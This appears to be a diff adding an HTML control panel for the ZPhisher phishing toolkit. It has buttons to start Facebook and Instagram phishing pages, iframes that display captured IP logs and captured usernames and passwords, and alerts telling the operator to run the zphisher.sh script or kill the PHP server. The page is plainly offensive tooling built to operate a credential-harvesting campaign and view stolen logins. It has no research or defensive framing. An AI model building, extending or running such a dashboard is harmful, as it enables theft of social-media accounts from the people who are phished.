@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ZPhisher Local Dashboard</title>
+  <style>
+    body { background: #111; color: #eee; font-family: sans-serif; text-align: center; }
+    h1 { color: #f33; }
+    button { margin: 10px; padding: 10px 20px; font-size: 16px; }
+    iframe { width: 90%; height: 300px; border: 1px solid #444; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h1>ZPhisher UI Dashboard</h1>
+
+  <button onclick="startPhish('facebook')">Start Facebook Phishing</button>
+  <button onclick="startPhish('instagram')">Start Instagram Phishing</button>
+  <button onclick="stopPhish()">Stop Server</button>
+
+  <h2>Captured IP Logs</h2>
+  <iframe src="logs/ip.txt"></iframe>
+
+  <h2>Captured Credentials</h2>
+  <iframe src="logs/usernames.txt"></iframe>
+
+  <script>
+    function startPhish(site) {
+      alert("Run this in terminal: ./zphisher.sh " + site);
+    }
+    function stopPhish() {
+      alert("Run this in terminal: pkill php");
+    }
+  </script>
+</body>
+</html>
